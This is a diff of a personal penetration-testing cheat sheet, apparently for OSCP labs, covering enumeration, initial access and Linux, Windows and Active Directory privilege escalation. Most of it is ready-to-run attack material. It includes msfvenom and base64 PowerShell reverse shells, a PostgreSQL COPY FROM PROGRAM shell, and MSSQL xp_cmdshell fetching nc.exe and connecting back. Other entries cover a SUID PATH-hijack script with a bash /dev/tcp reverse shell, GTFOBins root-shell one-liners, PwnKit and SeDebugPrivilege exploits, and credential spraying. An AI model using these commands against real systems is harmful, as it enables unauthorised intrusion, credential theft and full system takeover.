@@ -578,6 +578,11 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali IP> LPORT=4444 -f exe -o r
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.138 LPORT=4444 -f exe -o reverse.exe
 ```
 
+==🔴Listener : ==
+```
+rlwrap nc -lvnp 4444
+```
+
 #### ==🔵PowerShell : ==
 Exploit Script : 
 replace the kali ip here 
@@ -594,7 +599,7 @@ $client = New-Object System.Net.Sockets.TCPClient("192.168.163.199",4444);$strea
 ```
 you should get a shell on your Netcat listener on port 4444
 
-#### Reverse shell in Metasploit Multi Handler : 
+#### ==🔵Reverse shell in Metasploit Multi Handler : ==
 
 Both the reverse shell you are creating and the payload you are setting in multi handler should be same value
 create reverse shell For Metasploit Meterpreter handler : 
@@ -1184,38 +1189,48 @@ pip install -r requirements.txt --break-system-packages
 
 #### ==🔴Methodology : ==
 
-1. [ ] check exploit for version of smb
-2. [ ] visit website on the all ports running http , don't go by the port number only
-3. [ ] Check the webiste name or any name or version name on searchsploit
-4. [ ] visit the webistes with `https://` also , even though it says `http://`
-5. [ ] Browse to a non-existent path on the website to check if it gives version number
-6. [ ] for all services running , check their version number and search for their exploit
-7. [ ] `<url>`/.git
-8. [ ] Check: `/robots.txt, /sitemap.xml, /sitemap, /.git/, /.env, /web.config, /backup.zip, /<hostname>.zip`
-9. [ ] if there's a lfi , search where the configuration files of the service is , then read it using the lfi
-10. [ ] search for `<service name>/<website name>` exploit on google , read the exploit to check if we have to change the ip and port and start up a listener
-11. [ ] use wappalyzer
-12. [ ] to run python exploit try both `python2 abc.py` and `python3 abc.py`
-13. [ ] use last resort of msfconsole , it the exploit requires heavy modification , do rest 2 machines first then
-14. [ ] Check default credentials. Find a username without a password? Guess the username as a password. Did you check publicly exposed documents for usernames?
-15. [ ] Also, password reuse is absolutely a thing. Find a new username or password? Respray, especially with netexec (nxc) on Windows. And remember, spray usernames as passwords.
-16. [ ] visit all ports on the ip with http running  and directory brute force all those ports
-17. [ ] if a website has login use default credentials first `admin:admin` / `admin:password` ; or search for the default credentials of that web app online
-18. [ ] view page source code for any `vhost` or any hint
-19. [ ] after you upload a reverse shell 
+Remember for windows use `base64-encoded PowerShell reverse shell` and not linux reverse shells we don't know if the target has windows running (usually if it has IIS running) or linux so try both
+
+1. [ ] run nmap scan on TCP
+2. [ ] run nmap scan on UDP , check if SNMP is open
+3. [ ] visit website on the all ports running http , don't go by the port number only
+4. [ ] Directory brute force the website
+5. [ ] Check the webiste name or any name or version name on searchsploit
+6. [ ] in nmap port scan if any new service with new name , search it up on searchsploit
+7. [ ] on google , `name <version> exploit (add : poc github)`
+8. [ ] visit the webistes with `https://` also , even though it says `http://`
+9. [ ] Browse to a non-existent path on the website to check if it gives version number
+10. [ ] for all services running , check their version number and search for their exploit
+11. [ ] `<url>`/.git
+12. [ ] Check if virtual hosting is present (add to /etc/hos)
+13. [ ] Check: `/CHANGELOG(can give versions), /robots.txt, /sitemap.xml, /sitemap, /.git/, /.env, /web.config, /backup.zip, /<hostname>.zip`
+14. [ ] if there's a lfi , search where the configuration files of the service is , then read it using the lfi
+15. [ ] The `ss -ntlpu` command reveals a service listening on `127.0.0.1:8000` that was not visible in external port scans. To access this internal service, ligolo-ng creates a network tunnel from the compromised machine to the attacker's Kali system.
+16. [ ] search for `<service name>/<website name>` exploit on google , read the exploit to check if we have to change the ip and port and start up a listener
+17. [ ] use wappalyzer
+18. [ ] to run python exploit try both `python2 abc.py` and `python3 abc.py`
+19. [ ] use last resort of msfconsole , it the exploit requires heavy modification , do rest 2 machines first then
+20. [ ] check exploit for version of smb
+21. [ ] Check default credentials. Find a username without a password? Guess the username as a password. Did you check publicly exposed documents for usernames?
+22. [ ] Also, password reuse is absolutely a thing. Find a new username or password? Respray, especially with netexec (nxc) on Windows. And remember, spray usernames as passwords.
+23. [ ] visit all ports on the ip with http running  and directory brute force all those ports
+24. [ ] if a website has login use default credentials first `admin:admin` / `admin:password` ; or search for the default credentials of that web app online
+25. [ ] view page source code for any `vhost` or any hint
+26. [ ] after you upload a reverse shell 
 - [ ] you have to browse also to the file location `http://192.168.142.16/shell.php`
 - [ ] or find the folder where it is getting uploaded 
 - [ ] or if you uploaded a web shell : `http://192.168.142.16/shell.php?cmd=id`
 14. [ ] search for version exploit 
 15. [ ] `.ssh` keys
 16. [ ] sql injection 
-17. [ ] ftp anonymous login
-18. [ ] redis
-19. [ ] ident
-20. [ ] ssh login , same password as username
-21. [ ] ssh brute force
-22. [ ] if you find any files like `.zip` on the website , download it and see the files, what content it has
-23. [ ] magic bytes : file upload bypass
+17. [ ] ftp anonymous login ; leaked usernames via PDF metadata (exiftool)
+18. [ ] smb anonymous login
+19. [ ] redis
+20. [ ] ident
+21. [ ] ssh login , same password as username
+22. [ ] ssh brute force
+23. [ ] if you find any files like `.zip` on the website , download it and see the files, what content it has
+24. [ ] magic bytes : file upload bypass
 
 #### ==🔴Methodology (other): ==
 
@@ -1259,12 +1274,17 @@ try every cred you find everywhere, password reuse shows up a lot
 ==🔴If you find the number of ports less os suspicious that some ports are missing , revert the machine and try again==
 ==🔴ALWAYS RUN TWICE TO CONFIRM==
 
-==🔵Nmap ==
+==🔵Nmap (TCP and UDP both)==
+TCP :
 ```
 sudo nmap --min-rate 10000 -sCV -p- -Pn <IP>
 ```
-NEVER SKIP UDP
+UDP :
 ```
+sudo nmap -sU -p 161 -sV 192.168.183.156
+OR
+sudo nmap -F -sU -sV 192.168.158.149
+OR
 nmap -sU --top-ports 200 -T4 <IP>
 ```
 
@@ -1312,12 +1332,7 @@ add line :
 ==🔴RUN AGAINST ALL PORTS RUNNING HTTP
 FOCUS ON THE STATUS CODE AND NOT JUST THE LINK WHICH IT GIVES ON THE RIGHT
 
-DO BOTH : 
-
-If found nothing , then try bigger wordlist :
-```
-/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-```
+==🟡THEN AGAIN DO RECURSIVE DIRECTORY BRUTE FORCING ON INTERESTING DIRECTORIES==
 
 Quick initial scan : 
 ```
@@ -1329,6 +1344,12 @@ sudo gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 ```
 ==🔴After you find a directory then recursively brute force that sub-directory again
 then check those also==
+
+DO BOTH : 
+If found nothing , then try bigger wordlist :
+```
+/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+```
 
 ==🔴If IT IS ON A SPECIFIC PORT :==
 ```
@@ -2063,36 +2084,92 @@ main()
 
 ## ==🟢Services : ==
 
-#### ==🔵PostgreSQL (Port 543X)==
+#### ==🔵SNMP (UDP port 161)==
 
-try default credentials to log in :  postgres:postgres
-change port and IP here
+The `snmpwalk` tool fails to enumerate the SNMPv1 service, requiring the use of `snmpbulkwalk` with version 2c specification:
 ```
-psql -h 192.168.178.47 -p 5437 -U postgres
+snmpbulkwalk -c public -v2c <IP> .
 ```
-when prompted for password : `postgres`
+This reveals two usernames embedded in the SNMP MIB tree: `john` and `kiero`.
 
-First, we create a new table that allows us to execute commands.
+FTP Access and SSH Key Retrieval :
+Using the discovered usernames, Hydra performs credential reuse attacks against both FTP and SSH services:
 ```
-DROP TABLE IF EXISTS cmd_exec;  
-
-CREATE TABLE cmd_exec(cmd_output text);
+hydra -L usernames.txt -P usernames.txt ftp://<IP>
 ```
 
-Next, we create a payload file at `/tmp`, then run it with bash to connect back to our netcat listener.
-
-On kali : 
+This identifies the credential pair `kiero:kiero` for FTP access. FTP enumeration reveals an `id_rsa` private key file without password protection. The key is retrieved and used for SSH authentication:
 ```
-nc -nvlp 5437
+chmod 600 id_rsa
+ssh -i id_rsa john@192.168.158.149
 ```
 
-```
-COPY cmd_exec FROM PROGRAM 'echo "sh -i >& /dev/tcp/192.168.45.185/5437 0>&1" > /tmp/poo.sh';  
+-------
 
-COPY cmd_exec FROM PROGRAM '/bin/bash /tmp/poo.sh';
+**Enumerate SNMP using the public community string**
 ```
-we get reverse shell
+snmpwalk -c public -v1 -t 10 192.168.183.156
+```
+The output disclosed system information:
+```
+iso.3.6.1.2.1.1.4.0 = STRING: "Me <Jack@oscp>"
+iso.3.6.1.2.1.1.5.0 = STRING: "oscp.exam"
+```
+This revealed a potential username, `Jack`, and information about the machine.
 
+**Enumerate SNMPv2c extensions**
+```
+snmpwalk -c public -v2c -t 10 192.168.183.156
+```
+
+Here, the configuration revealed:
+```
+/bin/sh -c "echo \"jack:3PUKsX98BMupBiCf\" | chpasswd"
+```
+
+Breaking that down:
+- `echo "jack:password"` produces a username-password pair.
+
+The credentials extracted were:
+```
+Username: jack
+Password: 3PUKsX98BMupBiCf
+```
+You tested SSH:
+```
+ssh jack@<IP>
+```
+You also tested FTP:
+```
+ftp <IP>
+```
+And MySQL:
+```
+mysql -u jack -p'3PUKsX98BMupBiCf' -h <IP> -P 3306
+```
+The recorded authentication attempts did not succeed.
+
+Enumerate the web services
+Your scan identified several HTTP services, including port 8083.
+You configured hostname resolution:
+```
+sudo nano /etc/hosts
+```
+Added:
+```
+<IP> oscp.example.com
+<IP> oscp.exam
+```
+You discovered Vesta Control Panel running on:
+```
+https://<IP>:8083/
+```
+Identify the Vesta vulnerability
+You searched for relevant exploits:
+```
+searchsploit Vesta
+```
+You then used the Vesta exploit script from your notes.
 
 #### ==🔵SSH (Port 22)==
 
@@ -2384,6 +2461,22 @@ http://10.129.47.240/reverse-shell.aspx
 ```
 Go back to your listener to see if the shell connected back.
 
+-------
+
+Extract metadata using ExifTool
+Back in your Kali terminal:
+```
+exiftool -a -u BROCHURE-TEMPLATE.pdf
+# similarly for all pdf's
+```
+The metadata revealed:
+```
+Username : Password
+```
+These names provided potential usernames for further enumeration.
+
+Can use it for login panels , 
+
 #### ==🔴If you found database credentials :==
 
 Browsing `/var/www/html` shows a db.php file. Reading the contents of this provides us with login information for MySQL.
@@ -2411,12 +2504,72 @@ check if it's the same password for user root as well or any other user as well
 
 #### ==🔵MSSQL (port 1443) :==
 
+##### ==🔴For AD only :==
+
+==🔴CONNECT FOR AD : ==
+Connect remotely to MSSQL instance with Windows authentication
+```
+impacket-mssqlclient sql_svc:<password>@10.10.118.148 -windows-auth
+```
+You should see something similar to:
+```
+SQL>
+```
+If DNS resolution is not working, make sure the domain and domain controller names resolve through `/etc/hosts`, based on your scan results.
+
+---
+
+==🔴FOR AD : ==
+Enable advanced SQL Server options
+```
+EXECUTE sp_configure 'show advanced options', 1;
+RECONFIGURE;
+```
+Enable `xp_cmdshell`
+```
+EXECUTE sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+```
+
+Set up the file transfer
+On Kali, navigate to the folder containing `nc.exe`:
+```
+download netcat in the downloads folder
+```
+Start a Python HTTP server:
+```
+python3 -m http.server 1234
+```
+Return to your MSSQL client.
+Execute:
+```
+EXECUTE xp_cmdshell 'powershell wget http://10.10.118.147:1234/nc.exe -outfile C:\Users\Public\nc.exe';
+```
+
+Start the Netcat listener
+On Kali, open another terminal:
+```
+rlwrap nc -lvnp 4444
+```
+
+Execute the reverse shell on MS02
+Back in the MSSQL client:
+```
+EXECUTE xp_cmdshell 'C:\Users\Public\nc.exe -e powershell 10.10.118.147 4444';
+```
+
+Once the connection arrives, execute:
+```
+whoami
+```
+
 ##### ==🔴Connect ==
+
 Use Impacket's MSSQL client with the credentials :
 ```
 impacket-mssqlclient '<DOMAIN NAME>/<USERNAME>:<PASSWORD>@<FQ DOMAIN NAME>'
 ```
-If DNS resolution is not working, make sure the domain and domain controller names resolve through `/etc/hosts`, based on your scan results.
+
 ##### ==🔴xp_cmdshell ==
 
 enable `xp_cmdshell`
@@ -2434,7 +2587,6 @@ I’ll grab a PowerShell #3 (Base64) reverse shell from [revshells.com](https://
 xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAzADgAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
 ```
 we get reverse shell back
-
 ##### ==🔴Look for files around ==
 
 ex. look in 
@@ -2479,6 +2631,37 @@ Get-Content "C:\Path\To\ERRORLOG.BAK"
 ```
 Replace the example path with the actual file location you discover.
 Look for SQL login failures, particularly entries where a user has mistakenly supplied a password as a username.
+
+#### ==🔵PostgreSQL (Port 543X)==
+
+try default credentials to log in :  postgres:postgres
+change port and IP here
+```
+psql -h 192.168.178.47 -p 5437 -U postgres
+```
+when prompted for password : `postgres`
+
+First, we create a new table that allows us to execute commands.
+```
+DROP TABLE IF EXISTS cmd_exec;  
+
+CREATE TABLE cmd_exec(cmd_output text);
+```
+
+Next, we create a payload file at `/tmp`, then run it with bash to connect back to our netcat listener.
+
+On kali : 
+```
+nc -nvlp 5437
+```
+
+```
+COPY cmd_exec FROM PROGRAM 'echo "sh -i >& /dev/tcp/192.168.45.185/5437 0>&1" > /tmp/poo.sh';  
+
+COPY cmd_exec FROM PROGRAM '/bin/bash /tmp/poo.sh';
+```
+we get reverse shell
+
 #### ==🔵Jenkins :==
 
 Brute force the login form using hydra
@@ -2559,11 +2742,13 @@ ls -la
 Return to the SSH session running as `<ORIGINAL USERNAME>` on the original target machine.==
 
 #### ==🔵Squid Proxy :==
+
 configure FoxyProxy extension 
 with port number and ip address of victim machine 
 and then load the website 
 remember to turn off also when visiting other websites
 #### ==🔵Macro :==
+
 ```vb
 Sub MyMacro
 	Dim str as String
@@ -3157,26 +3342,27 @@ find / -name "proof.txt" 2>/dev/null
 
 ### ==🔴Methodology : ==
 
-1. run linpeas
-2. check carefully if you found db password
-3. check for password reuse for any password you find 
-4. try `su <username>`
-and enter the same database password
-5. sudo `sudo -l`
-6. suid `find / -user root -perm /4000 2>/dev/null`
-7. password reuse : `su <username>`
-then enter the same password as the username 
-8. If you got shell through wordpress : Browsing `/var/www/html` shows a db.php file. Reading the contents of this provides us with login information for MySQL.
-9. if you got shell through a cms/web application with a exploit name , check for the `<CMS configuration file>` location and see it's configuration file if there is a username and password , and use it for horizontal/vertical privilege escalation , check if it's password reuse
-10. check if `/etc/passwd` is writeable :
-11. kernel exploits
-12. ssh keys
-13. check after `id` which group you are in , `docker` or `disk`
-14. always check `/opt` also ; see if has any scripts running , `ls -la` to check if root is running it , or it has any suid/sgid binaries present , or if it has any zip file present to be cracked
-15. crontabs check (everything after `# -> commented out lines` ends is a cron)
-16. run process spy (pspy) , look for scripts running as root and check your permissions on them `ls -la <script path>`
-17. Capabilities `getcap -r / 2>/dev/null`
-18. Any mention of any tool in a script, always search for any known exploits
+1. [ ] run linpeas
+2. [ ] check carefully if you found db password
+3. [ ] check for password reuse for any password you find 
+4. [ ] try `su <username>`
+- [ ] and enter the same database password
+5. [ ] sudo `sudo -l`
+6. [ ] suid `find / -user root -perm /4000 2>/dev/null`
+7. [ ] password reuse : `su <username>`
+- [ ] then enter the same password as the username 
+8. [ ] If you got shell through wordpress : Browsing `/var/www/html` shows a db.php file. Reading the contents of this provides us with login information for MySQL.
+9. [ ] if you got shell through a cms/web application with a exploit name , check for the `<CMS configuration file>` location and see it's configuration file if there is a username and password , and use it for horizontal/vertical privilege escalation , check if it's password reuse
+10. [ ] check if `/etc/passwd` is writeable :
+11. [ ] kernel exploits
+12. [ ] check if internal services are running
+13. [ ] ssh keys
+14. [ ] check after `id` which group you are in , `docker` or `disk`
+15. [ ] always check `/opt` also ; see if has any scripts running , `ls -la` to check if root is running it , or it has any suid/sgid binaries present , or if it has any zip file present to be cracked or any `backup/` folder (transfer to kali and crack hash then password reuse)
+16. [ ] crontabs check (everything after `# -> commented out lines` ends is a cron)
+17. [ ] run process spy (pspy) , look for scripts running as root and check your permissions on them `ls -la <script path>`
+18. [ ] Capabilities `getcap -r / 2>/dev/null`
+19. [ ] Any mention of any tool in a script, always search for any known exploits
 
 ### ==🔵Linpeas : ==
 
@@ -3415,6 +3601,7 @@ cp , wget , find , pkexec , reboot , shutdown , dosbox , dbus-daemon-launch-help
 ```
 
 ==🔴If you dont know what the unknown binary does==
+
 see which binary it actually is beneath it : 
 for ex. here its `find` beneath `fileS` then go to GTFO bins to see for `find` binary
 ```
@@ -3427,11 +3614,74 @@ find (GNU findutils) 4.8.0
 /opt/fileS --help                   
 ```
 
-Find un-common custom binaries 
-for ex. in the `/home` folder : 
-check if it has path in `/opt` 
+==🔴OR ==
+```
+strings <only last binary name>
+```
+
+Find un-common custom binaries :
+for ex. in the `/home` folder : check if it has path in `/opt` 
 go to that directory and see what it is
-##### ==🔵Known exploits : ==
+
+##### ==🟢SUID Binary PATH Hijacking : ==
+
+we exploit a **SUID-root executable that calls another program without specifying its absolute path**.
+The objective is to make the vulnerable executable run our malicious version of `chpasswd` instead of the legitimate system binary.
+
+During enumeration, we discover an interesting executable has the SUID permission set :
+```
+/home/john/RESET_PASSWD
+```
+We need to understand what the executable does (`strings` extracts readable text from a binary.)
+```
+strings RESET_PASSWD
+```
+It has : 
+```
+echo kiero:kiero | chpasswd
+```
+In this case, we discover a reference to:
+```
+chpasswd
+```
+The important discovery is that `RESET_PASSWD` invokes `chpasswd`.
+It uses:
+```
+chpasswd
+```
+rather than:
+```
+/usr/sbin/chpasswd
+```
+This introduces a PATH hijacking opportunity.
+
+Modify PATH to prioritize `/tmp`
+prepend `/tmp` to PATH:
+```
+export PATH=/tmp:$PATH
+```
+Verify:
+```
+echo $PATH
+```
+Now `/tmp` has the highest search priority.
+
+A malicious `chpasswd` script containing a reverse shell payload is placed in `/tmp` and marked executable. When `RESET_PASSWD` executes with SUID root privileges, it invokes the attacker-controlled `chpasswd` instead of the legitimate binary:
+
+Create malicious `chpasswd` in `/tmp`
+```
+echo '#!/bin/bash' > /tmp/chpasswd
+echo 'bash -i >& /dev/tcp/192.168.45.156/4444 0>&1' >> /tmp/chpasswd
+chmod +x /tmp/chpasswd
+```
+
+Execute SUID binary to trigger malicious chpasswd
+```
+./RESET_PASSWD
+```
+This grants a root shell
+
+##### ==🟢Known exploits : ==
 
 Find all the SUID/SGID executables on the Debian VM
 ```
@@ -3444,19 +3694,20 @@ or go to GTFObins
 #only if the upper one doesn't work
 find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 ```
-###### ==🟢fileS==
+
+###### ==🔴fileS==
 
 ```
 /opt/fileS . -exec /bin/bash -p \; -quit
 ```
 
-###### ==🟢find==
+###### ==🔴find==
 
 ```
 /usr/bin/find . -exec /bin/sh -p \; -quit
 ```
 
-###### ==🟢cp==
+###### ==🔴cp==
 
 On the target:
 ```
@@ -3505,14 +3756,14 @@ su akshit
 ```
 Enter the password you selected when generating the hash.
 
-###### ==🟢dbus-daemon-launch-helper==
+###### ==🔴dbus-daemon-launch-helper==
 
 Execute the SUID payload to spawn a root shell:
 ```
 /usr/sbin/start-stop-daemon -n $RANDOM -S -x /bin/bash -- -p
 ```
 
-###### ==🟢dosbox==
+###### ==🔴dosbox==
 
 Run one by one : 
 change `<YOUR CURRENT USERNAME>` here
@@ -3524,7 +3775,7 @@ dosbox -c 'mount c /' -c "echo <YOUR CURRENT USERNAME> ALL=(ALL:ALL) ALL >>c:$LF
 sudo -s
 ```
 
-###### ==🟢reboot :==
+###### ==🔴reboot :==
 
 Find Service Config Files Which Are Writable
 ```
@@ -3563,7 +3814,7 @@ In the reverse shell :
 sudo /sbin/reboot
 ```
 just wait now , after a while, we get a root shell.
-###### ==🟢pkexec==
+###### ==🔴pkexec==
 
 For `/pkexec` : https://github.com/ly4k/PwnKit (Use Manually option)
 or https://github.com/joeammond/CVE-2021-4034/tree/main 
@@ -3571,7 +3822,7 @@ or https://github.com/joeammond/CVE-2021-4034/tree/main
 wget http://192.168.45.205/CVE-2021-4034.py
 python3 CVE-2021-4034.py
 ```
-###### ==🟢Backup : (Binary without a path / unquoted path)==
+###### ==🔴Backup : (Binary without a path / unquoted path)==
 
 ex. `/home/archangel/secret/backup`
 
@@ -3611,7 +3862,7 @@ start listener in another terminal :
 rlwrap -cAr nc -lvnp 4444
 ```
 
-##### ==🔵SUID shared object (.so) injection : ==
+##### ==🟢SUID shared object (.so) injection : ==
 
 find a `-so` executables
 then run this to check the files its asking for but not available 
@@ -3647,11 +3898,13 @@ now again run the initial executable
 /usr/local/bin/suid-so
 # run directly , you will get a root shell now
 ```
-##### ==🔵Environment Variables (without absolute service path) : ==
+##### ==🟢Environment Variables (without absolute service path) : ==
 
 find if you have any env files : `/usr/local/bin/suid-env`
 Find what it executes : `strings /usr/local/bin/suid-env`
-see if it starts any service without proving the full path
+
+see if it starts any service without providing the full path
+
 if no , create an exploit : 
 ```
 nano service.c
@@ -3678,6 +3931,7 @@ now just run the executable again :
 ```
 
 Environment Variables (without absolute service path) : will work only for bash version less than 4.0
+
 ### ==🔵Cron tabs :==
 
 Go to `crontab.guru` website and enter cron tab to see what it means
@@ -4155,6 +4409,20 @@ start a reverse listener on kali
 paste it in last of `os.py` file and save and exit
 now we wait to get root shell on our kali 
 
+### ==🔵Internal service running : ==
+
+```
+ss -ntlpu
+OR
+ss -ntlu
+```
+
+The `ss -ntlpu` command reveals a service listening on `127.0.0.1:8000` that was not visible in external port scans. To access this internal service, ligolo-ng creates a network tunnel from the compromised machine to the attacker's Kali system.
+
+Then after setting up ligolo , from our kali run : 
+```
+sudo nmap 240.0.0.1 -sV -p8000
+```
 
 ### ==🔵Linux Capabilities : ==
 ```
@@ -4625,6 +4893,11 @@ now from starting again try all privelege escalation vector since this is a new 
 
 # ==🟣Windows Privilege Escalation==
 
+If you get a restricted shell , type : 
+```
+whoami.exe /priv
+```
+
 To escalate to nt authority\system in same shell only and not need a rever shell :
 ```
 .\PrintSpoofer64.exe -i -c cmd
@@ -4643,19 +4916,21 @@ whoami /all
 ```
 if you are in administrators group but have medium integrity level , do UAC bypass
 
-then PrivEscCheck, then PowerUp, then WinPEAS.
+then PowerUp, then PrivEscCheck, then WinPEAS.
 
-- Quick check C:\ drive for non default folders.
+- Check in `C:\` folder for non default folders ; if you have any not original file like `windows.old` and if it has sam and system which you can download and dump
 - `tree /F /A .` on C:/Users/ directory, look for suspicious files.
 - Quick check Program Files to find non default Software
-
-- Check in `C:\` folder if you have any not original file like `windows.old` and if it has sam and system which you can download and dump
 - Find stored credentials of putty
 In powershell , run : 
 ```
 reg query HKCU\Software\SimonTatham\PuTTY\Sessions /t REG_SZ /s
 ```
+Other Windows Components > putty
 - check powershell history
+- Privilege Attacks (`whoami /all`)
+- Service Abuse
+- Registry Attacks > Weak Registry Permissions
 
 #### ==🔵General : ==
 
@@ -5471,6 +5746,79 @@ switch to PowerShell :
 PowerShell
 ```
 
+**Check the PowerShell history location**
+Run this inside your Evil-WinRM session:
+```
+(Get-PSReadlineOption).HistorySavePath
+```
+This command tells you where the current user's command history is stored.
+
+**Try the expected history file**
+```
+type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ServerRemoteHost_history.txt
+```
+Your output:
+```
+Cannot find path ... because it does not exist.
+```
+This means that particular file was not present. It does not mean PowerShell history was unavailable.
+
+Navigate to the PSReadLine directory
+```
+cd C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
+```
+Check its contents:
+```
+dir
+```
+the relevant file was named `ConsoleHost_history.txt`, not `ServerRemoteHost_history.txt`.
+
+Read the command history
+```
+type ConsoleHost_history.txt
+```
+Or:
+```
+Get-Content ConsoleHost_history.txt
+```
+recorded output:
+```
+C:\users\support\admintool.exe hghgib6vHT3bVWf cmd
+C:\users\support\admintool.exe cmd
+
+shutdown /r /t 7
+```
+This is the important discovery.
+The first command shows that someone previously executed:
+```
+C:\users\support\admintool.exe hghgib6vHT3bVWf cmd
+```
+The value `hghgib6vHT3bVWf` was supplied as an argument to AdminTool.
+
+Check the backup history file
+```
+type ConsoleHost_history.txt.1
+```
+Output:
+```
+C:\users\support\admintool.exe hghgib6vHT3bVWf cmd
+C:\users\support\admintool.exe cmd
+```
+This confirmed that the same command appeared in another saved history file.
+
+Use the discovered credential on MS02
+From your Kali terminal, you then tried the discovered value against MS02:
+```
+evil-winrm -i 10.10.143.154 -u Administrator -p 'hghgib6vHT3bVWf'
+```
+Verify the account:
+```
+whoami
+```
+You obtained Administrator access to MS02.
+
+----
+
 LOOK FOR `PSCredential ('svc_deploy', $p)` THE FIRST ONE IN BRACKETS WILL BE THE USERNAME
 ```
 cat C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
@@ -5641,6 +5989,16 @@ Open up a new RDP session (with username as admin) to trigger a reverse shell ru
 
 ###### ==🔵Weak Registry Permissions (changing path of executable in registry)==
 
+OR use `PrivescCheck` :
+Severity : High
+
+TA0004
+Name : Services : Registry permissions 
+
+Modifiable path : `<has a registry path>`
+
+---------
+
 Use Winpeas 
 grep only that section from winpeas output 
 ```
@@ -5680,6 +6038,7 @@ sc qc regsvc
 ```
 also check `BINARY_PATH_NAME` here to see if path changed or not
 if it says `START_TYPE : DEMAND_START` , we can start it manually
+or if it says `START_TYPE : AUTO_START` and we have SeShutdown privilege , we can restart the machine and get shell
 
 start listener on kali 
 ```
@@ -5730,7 +6089,7 @@ run the msi
 well get a reverse shell back 
 ### ==🟢Privilege Attacks==
 
-###### ==🔵to check current privileges==
+#### ==🔵to check current privileges==
 ```
 whoami /priv
 whoami /all
@@ -5741,7 +6100,7 @@ whoami /all
 ```
 systeminfo
 ```
-###### ==🔵if SeImpersonatePrivilege : Disabled : ==
+#### ==🔵if SeImpersonatePrivilege : Disabled : ==
 Full powers : 
 ```
 https://github.com/itm4n/FullPowers
@@ -5967,6 +6326,55 @@ we get admin hash
 ```
 Format: RID : LM hash : NT hash
 ```
+
+#### ==🔵SeDebugPrivilege : ==
+
+Go to 
+```
+https://github.com/bruno-1337/SeDebugPrivilege-Exploit/releases
+```
+download :
+```
+SeDebugPrivesc.exe
+```
+
+transfer to windows victim
+
+Go to https://www.revshells.com/
+Use Reverse > windows > PowerShell #3 (Base64)
+enter kali ip and port
+copy the payload
+
+start listener on kali 
+
+
+Now in the victim shell : 
+search all the processes : 
+If in cmd : 
+```
+powershell -c 'ps'
+```
+If in powershell : 
+```
+ps
+```
+see only the last column `ProcessName` and the 3rd last column `Id` for the process ID 
+
+If it gives error `Failed to open process` then try another process id and its process name
+
+Identify a suitable SYSTEM-owned process, such as `lsass` or `winlogon` or  `vmtoolssd` or `smss` or `conhost` process ID
+or any other try one by one
+
+Usage
+```
+.\SeDebugPrivesc.exe <PID> <Copied Reverse shell>
+```
+you will get a listener back 
+you should get shell as `nt autority\system` if it's a different username , try with another process ID
+
+now again add user to admin and dump hashes
+you can check in your previous shell by `whoami` to see which user to add to admins
+
 
 ### ==🟢Other Windows Components==
 
@@ -8383,6 +8791,7 @@ queries :
 4. as-rep roastable users
 5. shortest path from owned objects
 6. shortest path to domain admins
+7. on profile of owned account , check for outbound object control
 
 -----
 
@@ -8401,7 +8810,17 @@ update username and password list with new username and password
 
 do as-rep roasting (if found)
 crack hash
-update username and password list with new username and password
+
+If you found credentials for `sql_svc` :
+It provides access to the Microsoft SQL Server
+Refer to Initial Acess > MSSQL 
+login to the sql db on that client IP
+
+==🔴update username and password list with new username and password==
+
+-----
+
+Keep ==🔴updating username and password list with new username and password==
 
 -------
 
@@ -8463,7 +8882,7 @@ if xfreerdp not working , run remmina
 
 AFTER YOU GET A
 ==🔴SYSTEM SHELL OR ADMIN==
-ON A MACHINE , REMOTELY DUMP HASHES : 
